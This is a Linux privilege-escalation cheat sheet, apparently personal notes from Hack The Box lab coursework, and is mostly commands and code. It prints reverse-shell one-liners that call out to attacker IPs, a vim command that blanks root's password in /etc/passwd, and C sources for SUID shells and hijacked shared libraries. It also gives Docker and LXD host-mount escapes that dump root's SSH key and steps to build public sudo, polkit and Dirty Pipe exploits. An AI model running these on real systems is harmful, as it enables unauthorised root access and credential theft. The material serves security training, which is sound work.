# Privilege escalation Linux

## Environment enumeration

Too find the distro version:
```
cat /etc/os-release
```

Print the PATH variable:
```
echo $PATH
```
Print all the env variables:
```
env
```

Kernel version:
```
uname -a
```

CPU type:
```
lscpu 
```

List available shells:
```
cat /etc/shells
```

See other interfaces and their routes:
```
route
```

Check existing users:
```
cat /etc/passwd
```
Group memberships:
```
cat /etc/group
```

View mounted filesystems:
```
df -h
```

Print unmounted filesystems:
```
cat /etc/fstab | grep -v "#" | column -t
```

Find hidden files:
```
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
```

Find hidden directories:
```
find / -type d -name ".*" -ls 2>/dev/null
```

Enumerate temporary files:
```
ls -l /tmp /var/tmp /dev/shm
```

Recursively look in files for content matching a regex:
```
grep -R -n -E 'HTB\{.*\}' /
```

Check which users last logged in:
```
lastlog
```

Check logged in users:
```
w
```

Command history:
```
history
```

Find files with `_history`
```
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```

Enumerate cronjobs:
```
ls -la /etc/cron.daily/
```

Create a list of all installed packages:
```
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```

Enumerate installed binaries:
```
ls -l /bin /usr/bin/ /usr/sbin/
```

Check vunerable packages:
```
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
```

Find configuration files:
```
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```

Find shell scripts:
```
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

Check services running as root:
```
ps aux | grep root
```

Enumerate possible ssh keys:
```
ls ~/.ssh
```

Add the current directory to the path:
```
PATH=.:${PATH}
```

## Wildcard abuse

If cronjobs exist which use wildcard charachters we can create some files to get root access.
see https://academy.hackthebox.com/module/51/section/473

## Escaping Restricted Shells

Do tricks like:

``` 
echo $(<flag.txt)
```

## Special permissions

The Set User ID upon Execution (setuid) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The setuid bit appears as an s.

We can find these programs using this command:
```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

The Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them. These files can be enumerated using the following command: find / -uid 0 -perm -6000 -type f 2>/dev/null. These files can be leveraged in the same manner as setuid binaries to escalate privileges.

```
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

We can use https://gtfobins.github.io/ ( GTFObins) to see which binaries we can use to hijack their privileges.

For example the apt-get command can sometimes be used to execute commands as root:

```
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

## Sudo rights abuse

Enumerate the sudo rights:
```
sudo -l

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

We can see we can run tcpdump as root without a password, moreover reading the docs of the tcpdump it is clear we can 
initiate a user defined command:
```
htb_student@NIX02:~$ man tcpdump

<SNIP> 
-z postrotate-command              

Used in conjunction with the -C or -G options, this will make `tcpdump` run " postrotate-command file " where the file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2 will compress each savefile using gzip or bzip2.
```
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```
Where `/tmp/.test` is a reverse shell:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```

## Privileged groups

If you are member of any of these groups it would be quite easy to escalate priviles:
```
lxd, docker, disk, adm
```
See  https://academy.hackthebox.com/module/51/section/477 for more details

## Capabilities

We can enumerate the capabilities with this one liner:
```
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

Enumerate capabilities of a specific binary:
```
getcap /usr/bin/vim.basic
/usr/bin/vim.basic cap_dac_override=eip
```
You can see we have the cap_dac_override capability which means we can write/read any file...

This command effectively deletes the x in the /etc/passwd file which means the user root has no password anymore:
```
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```

## Vulnerable services

Some services might be vulnerable ... the example here given is the `screen` service.
For instance this service is vulnerable:
```
screen -v

Screen version 4.05.00 (GNU) 10-Dec-16
```

## Cron job abuse

Find writable files which might be scripts executed by cronjobs:
```
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

Check running processes without root privileges:
```
./pspy64 -pf -i 1000
```

If we find a script which is executed by a root user that we can modify we can append a reverse shell oneliner:
```
bash -i >& /dev/tcp/10.10.15.117/443 0>&1
```

## Containers 

If we are in the lxc` or `lxd` groups we might be able to use the LXD virtualization technology to escalate privileges.

```
#Find a template and import it
lxc image import ubuntu-template.tar.xz --alias ubuntutemp  
#Verify image list that it is added
lxc image list
```

Next we start the image (privilegd) and mount the file system of the host in the container:
```
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

lxc start privesc
lxc exec privesc /bin/bash
ls -l /mnt/root
```

## Docker


To gain root privileges through Docker, the user we are logged in with must be in the docker group. This allows him to use and control the Docker daemon.

Within the docker container we can find the Unix pipe which is used to communicate to the host system:
```
ls -al

total 8
drwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 .
drwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
```

We can download the docker binary here: https://master.dockerproject.com/linux/x86_64/docker
Using different ways we can get it in the container:
```
wget https://<parrot-os>:443/docker -O docker
chmod +x docker
ls -l
```

Next we can spin up a new priviliged container on the host with the filesystem of the host mounted inside the container:
```
#Start it
/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
#Check if it is running
/tmp/docker -H unix:///app/docker.sock ps
#Get a shell
/tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash

#Dump some secrets on the host:
cat /hostsystem/root/.ssh/id_rsa
```


From the host system if we are not in the docker group but have write priviliges over the socket we can still start a container like this:
```
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

## Logrotate

Too exploit logrotate, we need some requirements that we have to fulfill.
- we need write permissions on the log files
-logrotate must run as a privileged user or root
- vulnerable versions:  3.8.6 3.11.0 3.15.0 3.18.0

Fist get this on the machine you wish to escalate privileges on:
```
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
```

Then make a payload. In our case we are going to compile program 
which simply spawns a shell and use a payload in logrotten to set the suid bit of this program so it runs as root 
but you do not need to be root to start the program.

Create a suid shell:
```
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0); // Tell the system to use the Root User ID
    setgid(0); // Tell the system to use the Root Group ID
    system("/bin/bash -p"); // Execute bash in 'privileged' mode
    return 0;
}
```
Compile it:
```
gcc wrapper.c -o suid_shell
```

Then draft a payload for logrotten to execute:
```
echo 'chown root:root /home/htb-student/logrotten/suid_shell;chmod 4755 /home/htb-student/logrotten/suid_shell' > payload
```

Start logrotten:
```
./logrotten -p ./payload /home/htb-student/backups/access.log
```
Kick off a rotation by writing something to the log file:
```
echo koen >> /home/htb-student/backups/access.log
```

# Weak NFS privileges

We should check if there are NFS shares on the box we desire to escalate privileges.
If we have an NFS share with `no_root_squash` set,  we transfer a binary as the local root user (from the attack box) and set the SUID bit... We can basically compile a program which starts a shell, copy it to the share, set the SUID bit and then execute it from the box under attack.

Enumerate NFS shares on the box we want to get root on:
```
cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

Create a suid shell on the attack box:
```
/tmp$ cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```
Compile it:
```
gcc shell.c -o shell
```
Mount the nfs share, copy the shell and set the SUID bit:
```
sudo mount -t nfs 10.129.19.104:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell
```

## Tmux sessions

The Setup (The Vulnerability)
A root user creates a "shared" session. By using the -S flag, they specify a custom socket path instead of the default protected one.

```
tmux -S /shareds new -s debugsess
chown root:devs /shareds
```
The Flaw: The administrator changed the group ownership of /shareds to devs. Now, anyone in the devs group has read/write access to the root session's "brain."

In cybersecurity, Tmux Session Hijacking is a classic privilege escalation technique. It occurs when a highly privileged user (like root) starts a tmux session but stores the socket file—the gateway to that session—in a location with weak permissions.

If you can access that socket file, you aren't just looking at their screen; you are literally stepping into their shoes with their level of authority.

The Mechanics of the Attack
The vulnerability boils down to file permissions. In Linux, everything is a file, including the communication channel (socket) tmux uses.

1. The Setup (The Vulnerability)
A root user creates a "shared" session. By using the -S flag, they specify a custom socket path instead of the default protected one.

Bash
tmux -S /shareds new -s debugsess
chown root:devs /shareds
The Flaw: The administrator changed the group ownership of /shareds to devs. Now, anyone in the devs group has read/write access to the root session's "brain."

2. Discovery (The Recon)
As a low-privileged user, you look for active tmux sessions. If you see one running as root with a specific socket path, your ears should perk up.

```
ps aux | grep tmux
root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
```

Now just attach to the tmux session:
```
tmux -S /shareds
```

## Kernel exploits

Check kernel version:
```
uname -a
```
```
cat /etc/lsb-release 
```
Then look for kernel exploits online.

If we have found a vunerable OS we can use that exploit (Dirty cow: https://vulners.com/zdt/1337DAY-ID-30003)
Compile the exploit:
```
gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
```

Run the exploit:
```
./kernel_exploit 
```
## Shared libraries

We can check what dll a program uses by use of the `ldd` command:
```
ldd /bin/ls
```
Code can be instructed to load a shared library using multiple mechanism... But one interesting one is the
environment variable `LD_PRELOAD`. We can point it to a path and when the program starts it will automatically load this library first. We can use this to get root because we can compile a shared library which spawns a shell... Next we need to set this env variable and find a program which we are allowed to start as root


First find a program which we can control but runs as root:
```
sudo -l
```

Next we compile a shared library which spawns a shell:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
Compile it:
```
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

Set the env variable and restart the program:
```
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

## Shared object hijacking

With `ldd`we can find the shared objects a binary is using:
```
ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```
Here we can see a non-standard library is used in a location we can control (rw permissions).

We see a non-standard library named libshared.so listed as a dependency for the binary. As stated earlier, it is possible to load shared libraries from custom locations. One such setting is the RUNPATH configuration. Libraries in this folder are given preference over other folders. This can be inspected using the readelf utility.

```
readelf -d payroll  | grep PATH
```

We need a function name the binary uses to call the library.. We can copy a random library, rename it, run the program and look at the error to figure out which function is called:
```
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

Once we have the name we can compile a small program with this function name which actually spawns a shell:
```
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 
```
Compile it:
```
gcc src.c -fPIC -shared -o /development/libshared.so
```

Now we can run the program and we should get a shell.

## Exploiting python

Basically we can abuse the mechanism of how python imports modules... Basically the `PYTHONPATH` env variable is a list of folders (with priority) where python searches to import modules.
If we control a path which has a higher priority then the actual module we can "fake" the module and insert our own code.

See the location of a package:
```
pip3 show psutil
```
Our own malicious module:
```
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

If we have the correct permission (can run python as root and set ENV variables), we can change `PYTHONPATH` like this:
```
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```
## Exploiting sudo 

The `/etc/sudoers` file specifies which users or groups are allowed to run specific programs and with what privileges.

Check how sudo is configured:
```
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
```

Some older sudo versions are vulnerable to this exploit:
- 1.8.31 - Ubuntu 20.04
- 1.8.27 - Debian 10
- 1.9.2 - Fedora 33
- and others

```
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
```

THis will list vulnerable versions with a number:
```
./sudo-hax-me-a-sandwich
```
Check which version we have:
```
cat /etc/lsb-release
```
Now we have found the number we run the exploit:
```
./sudo-hax-me-a-sandwich 1
```

Another vulnerability was found in 2019 that affected all versions below 1.8.28, which allowed privileges to escalate even with a simple command. This vulnerability has the CVE-2019-14287 and requires only a single prerequisite. It had to allow a user in the /etc/sudoers file to execute a specific command.

```
cry0l1t3@nix02:~$ sudo -l
[sudo] password for cry0l1t3: **********

User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id
```
OR
```
User htb-student may run the following commands on ubuntu:
    (ALL, !root) /bin/ncdu
```
Notice in the above we are allowed to execute the command as any user except root. 

But if vunerable we can get around this by:
```
sudo -u#-1 id
```


## Polkit
If a vulnerable version of polkit is installed we might be able to exploit it with:
```
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc
```

## Dirty pipe exploit
Exploit in the linux kernal we can exploit (v5.8 to 5.17)

```
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
```

Get root via:
```
./exploit-1
```

Altenatively find a SUID binary 
```
find / -perm -4000 2>/dev/null
#Once found do
./exploit-2 /usr/bin/sudo
```

## Netfilter

See https://academy.hackthebox.com/module/51/section/1598

